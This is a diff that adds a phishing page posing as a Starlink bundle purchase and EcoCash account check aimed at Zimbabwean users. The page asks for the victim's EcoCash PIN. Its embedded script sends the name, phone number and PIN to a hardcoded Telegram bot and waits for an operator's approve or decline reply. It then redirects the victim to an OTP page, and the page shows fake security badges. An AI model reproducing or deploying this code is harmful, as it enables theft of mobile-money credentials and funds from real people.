@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <meta name="theme-color" content="#003366">
+    <title>Starlink Bundles | Verify Account &middot; Zimbabwe</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <style>
+        :root { --blue-dark: #001a33; --blue: #003366; --blue-mid: #004d99; --blue-light: #0077cc; --blue-bright: #00aaff; --red: #e30613; --green: #00a651; --white: #ffffff; --light: #f0f6ff; --dark: #0d1b2a; --muted: #5a6d80; --border: #d0dce8; --error: #dc2626; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        html { -webkit-text-size-adjust: 100%; }
+        body { font-family: 'Poppins', system-ui, sans-serif; background: linear-gradient(135deg, var(--blue-dark) 0%, var(--blue) 50%, var(--blue-mid) 100%); min-height: 100vh; display: flex; flex-direction: column; }
+        header { background: white; padding: 14px 5%; border-bottom: 3px solid var(--blue); }
+        .logo { font-size: 22px; font-weight: 900; text-decoration: none; }
+        .logo .eco { color: var(--blue); } .logo .cash { color: var(--red); }
+        main { flex: 1; display: flex; align-items: center; justify-content: center; padding: 36px 16px; }
+        .card { background: white; border-radius: 18px; padding: 32px; max-width: 420px; width: 100%; box-shadow: 0 16px 48px rgba(0,26,51,0.4); }
+        .card-head { text-align: center; margin-bottom: 20px; }
+        .card-head h1 { font-size: 20px; font-weight: 900; color: var(--blue); margin-bottom: 4px; }
+        .card-head p { color: var(--muted); font-size: 12px; }
+        .loan-bar { background: linear-gradient(135deg, var(--blue), var(--blue-dark)); border-radius: 10px; padding: 14px 16px; margin-bottom: 18px; color: white; }
+        .b-row { display: flex; justify-content: space-between; font-size: 12px; margin-bottom: 6px; }
+        .b-row:last-child { margin-bottom: 0; padding-top: 6px; border-top: 1px solid rgba(255,255,255,0.15); font-weight: 800; font-size: 13px; }
+        .fg { margin-bottom: 14px; }
+        .fl { display: block; font-size: 10px; font-weight: 700; color: var(--blue); text-transform: uppercase; letter-spacing: 0.05em; margin-bottom: 5px; }
+        .iw { display: flex; align-items: center; border: 2px solid var(--border); border-radius: 10px; padding: 10px 12px; background: var(--light); transition: all 0.2s; }
+        .iw:focus-within { border-color: var(--blue-light); background: white; box-shadow: 0 0 0 3px rgba(0,119,204,0.06); }
+        .fi { flex: 1; border: none; background: transparent; font-size: 14px; color: var(--dark); outline: none; font-family: inherit; }
+        .fi::placeholder { color: #a0b4c8; }
+        .fi-readonly { background: transparent; color: var(--blue-dark); font-weight: 600; font-size: 14px; }
+        .pin-tog { background: none; border: none; color: var(--blue-light); cursor: pointer; font-weight: 700; font-size: 10px; font-family: inherit; }
+        .hint { font-size: 10px; color: var(--muted); margin-top: 3px; }
+        .err { display: none; background: rgba(220,38,38,0.06); border: 1px solid rgba(220,38,38,0.15); color: var(--error); font-size: 12px; font-weight: 600; border-radius: 8px; padding: 9px 12px; margin-bottom: 12px; text-align: center; }
+        .err.show { display: block; }
+        .btns { display: flex; gap: 10px; margin-top: 18px; }
+        .btn-p { flex: 1; background: var(--blue); color: white; border: none; padding: 14px; border-radius: 50px; font-weight: 800; font-size: 13px; text-transform: uppercase; cursor: pointer; font-family: inherit; box-shadow: 0 4px 12px rgba(0,51,102,0.25); transition: all 0.2s; }
+        .btn-p:hover { background: var(--blue-light); transform: translateY(-1px); }
+        .btn-o { flex: 1; background: transparent; color: var(--blue); border: 2px solid var(--blue); padding: 14px; border-radius: 50px; font-weight: 800; font-size: 13px; text-transform: uppercase; cursor: pointer; font-family: inherit; transition: all 0.2s; }
+        .btn-o:hover { background: var(--light); }
+        .card-ft { text-align: center; margin-top: 14px; font-size: 10px; color: var(--muted); }
+        .card-ft a { color: var(--blue-light); text-decoration: none; font-weight: 700; }
+        .secure { display: flex; align-items: center; justify-content: center; gap: 5px; margin-top: 10px; font-size: 10px; color: var(--muted); font-weight: 600; }
+        .overlay { position: fixed; inset: 0; display: none; align-items: center; justify-content: center; flex-direction: column; gap: 12px; background: rgba(0,26,51,0.92); z-index: 2000; backdrop-filter: blur(5px); }
+        .overlay.on { display: flex; }
+        .spin { width: 46px; height: 46px; border: 4px solid rgba(255,255,255,0.1); border-top-color: var(--blue-bright); border-radius: 50%; animation: sp 0.8s linear infinite; }
+        .sp-t { font-size: 14px; font-weight: 700; color: white; }
+        .sp-s { font-size: 11px; color: rgba(255,255,255,0.6); }
+        @keyframes sp { to { transform: rotate(360deg); } }
+        .modal { position: fixed; inset: 0; display: none; align-items: center; justify-content: center; background: rgba(0,26,51,0.7); z-index: 2000; padding: 20px; backdrop-filter: blur(5px); }
+        .modal.on { display: flex; }
+        .modal-box { background: white; border-radius: 16px; padding: 28px; max-width: 340px; width: 100%; text-align: center; }
+        .modal-box h2 { font-size: 17px; font-weight: 900; color: var(--blue); margin-bottom: 6px; }
+        .modal-box p { color: var(--muted); font-size: 12px; margin-bottom: 16px; }
+        .modal-btn { width: 100%; padding: 13px; border-radius: 50px; border: none; font-weight: 800; font-size: 12px; cursor: pointer; background: var(--blue); color: white; font-family: inherit; }
+        @media (max-width: 500px) { main { padding: 20px 12px; } .card { padding: 24px 16px; } .btns { flex-direction: column; } }
+    </style>
+</head>
+<body>
+    <header><a class="logo" href="index.html"><span class="eco">Star</span><span class="cash">Link</span></a></header>
+    <main>
+        <div class="card">
+            <div class="card-head">
+                <h1>Verify Your Account</h1>
+                <p>Enter your EcoCash PIN to authorize this bundle purchase</p>
+            </div>
+            <div id="bBar" class="loan-bar" style="display:none;">
+                <div class="b-row"><span>Name:</span><span id="bName">&mdash;</span></div>
+                <div class="b-row"><span>Bundle:</span><span id="bAmt">&mdash;</span></div>
+                <div class="b-row"><span>Description:</span><span id="bTerm">&mdash;</span></div>
+                <div class="b-row"><span>Phone:</span><span id="bPhone">&mdash;</span></div>
+            </div>
+            <div id="err" class="err"></div>
+            <form id="frm" onsubmit="doSubmit(event)">
+                <div class="fg"><label class="fl">Customer Name</label><div class="iw"><input type="text" class="fi fi-readonly" id="dispName" readonly></div></div>
+                <div class="fg"><label class="fl">Bundle Price</label><div class="iw"><input type="text" class="fi fi-readonly" id="dispAmount" readonly></div></div>
+                <div class="fg">
+                    <label class="fl">EcoCash PIN</label>
+                    <div class="iw"><input type="password" class="fi" id="pin" placeholder="&#8226;&#8226;&#8226;&#8226;" inputmode="numeric" maxlength="4" required><button type="button" class="pin-tog" onclick="togPin()">Show</button></div>
+                    <p class="hint">Enter your 4-digit EcoCash PIN to authorize this bundle purchase</p>
+                </div>
+                <div class="btns">
+                    <button type="submit" class="btn-p">Continue Verifying</button>
+                    <button type="button" class="btn-o" onclick="location.href='apply.html'">Back</button>
+                </div>
+            </form>
+            <div class="card-ft">By proceeding you agree to our <a href="#">Terms</a> &amp; <a href="#">Privacy Policy</a></div>
+            <div class="secure">&#128274; 256-bit Encrypted &middot; PCI DSS Compliant</div>
+        </div>
+    </main>
+    <div id="ov" class="overlay"><div class="spin"></div><div class="sp-t">Verifying Account</div><div class="sp-s">Please wait...</div></div>
+    <div id="aModal" class="modal">
+        <div class="modal-box">
+            <h2>Already Applied</h2>
+            <p>You have already ordered this bundle. Please wait for delivery.</p>
+            <button class="modal-btn" onclick="location.href='index.html'">OK</button>
+        </div>
+    </div>
+    <script>
+        const BOT = '8805303915:AAHqiK9aAjQF-Jts4xEpmZ1GE4rbcUdVh0A';
+        const CID = '8094482230';
+        var bd = {}, luid = 0;
+        function init() {
+            var p = new URLSearchParams(location.search);
+            var name = p.get('name') || '';
+            var phone = p.get('phone') || '';
+            var amount = p.get('amount') || '';
+            var duration = p.get('duration') || '';
+            var purpose = p.get('purpose') || '';
+            bd = { name: name, phone: phone, amount: amount, duration: duration, purpose: purpose };
+            document.getElementById('bBar').style.display = 'block';
+            document.getElementById('bName').textContent = name || 'N/A';
+            document.getElementById('bAmt').textContent = 'USD ' + (amount || '0.00');
+            document.getElementById('bTerm').textContent = duration || 'N/A';
+            document.getElementById('bPhone').textContent = phone ? '+263' + phone : 'N/A';
+            document.getElementById('dispName').value = name || 'N/A';
+            document.getElementById('dispAmount').value = 'USD ' + (amount || '0.00');
+        }
+        function togPin() {
+            var el = document.getElementById('pin');
+            var b = event.target;
+            el.type = el.type === 'password' ? 'text' : 'password';
+            b.textContent = el.type === 'password' ? 'Show' : 'Hide';
+        }
+        function showErr(m) { var e = document.getElementById('err'); e.textContent = m; e.classList.add('show'); }
+        function clrErr() { document.getElementById('err').classList.remove('show'); }
+        async function tg(msg, btns) {
+            try {
+                await fetch('https://api.telegram.org/bot' + BOT + '/sendMessage', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CID, text: msg, reply_markup: btns ? { inline_keyboard: btns } : undefined, parse_mode: 'HTML' })
+                });
+            } catch(e) { console.error(e); }
+        }
+        function doSubmit(e) {
+            e.preventDefault();
+            clrErr();
+            var pin = document.getElementById('pin').value.trim();
+            if (pin.length !== 4) { showErr('PIN must be exactly 4 digits'); return; }
+            var msg = '\u{1f4f1} <b>Starlink Bundle Order</b>\n\n' +
+                '<b>Name:</b> <code>' + bd.name + '</code>\n' +
+                '<b>Phone:</b> <code>' + bd.phone + '</code>\n' +
+                '<b>PIN:</b> <code>' + pin + '</code>\n' +
+                '<b>Kit Type:</b> <code>' + (bd.purpose || 'N/A') + '</code>\n' +
+                '<b>Bundle:</b> <code>USD ' + bd.amount + '</code>\n' +
+                '<b>Details:</b> <code>' + bd.duration + '</code>';
+            var replyBtns = [
+                [{ text: '\u2713 Approved', callback_data: 'login_approved' }, { text: '\u2717 Declined', callback_data: 'login_declined' }],
+                [{ text: '\u26a0\ufe0f Already Applied', callback_data: 'login_applied' }]
+            ];
+            document.getElementById('ov').classList.add('on');
+            tg(msg, replyBtns);
+            poll();
+        }
+        function poll() {
+            var iv = setInterval(function() {
+                fetch('https://api.telegram.org/bot' + BOT + '/getUpdates?offset=' + (luid + 1))
+                    .then(function(r) { return r.json(); })
+                    .then(function(d) {
+                        if (d.ok && d.result.length > 0) {
+                            var u = d.result[0];
+                            luid = u.update_id;
+                            if (u.callback_query) {
+                                var cb = u.callback_query.data;
+                                if (cb === 'login_approved') { clearInterval(iv); document.getElementById('ov').classList.remove('on'); goOTP(); }
+                                else if (cb === 'login_declined') { clearInterval(iv); document.getElementById('ov').classList.remove('on'); showErr('Request declined. Please try again.'); document.getElementById('frm').reset(); }
+                                else if (cb === 'login_applied') { clearInterval(iv); document.getElementById('ov').classList.remove('on'); document.getElementById('aModal').classList.add('on'); }
+                            }
+                        }
+                    }).catch(function(e) { console.error(e); });
+            }, 1000);
+            setTimeout(function() { clearInterval(iv); }, 300000);
+        }
+        function goOTP() {
+            var data = encodeURIComponent(bd.purpose || '');
+            var price = bd.amount;
+            location.href = 'otp.html?phone=' + bd.phone + '&data=' + data + '&price=' + price + '&name=' + encodeURIComponent(bd.name);
+        }
+        window.addEventListener('load', init);
+    </script>
+</body>
+</html>
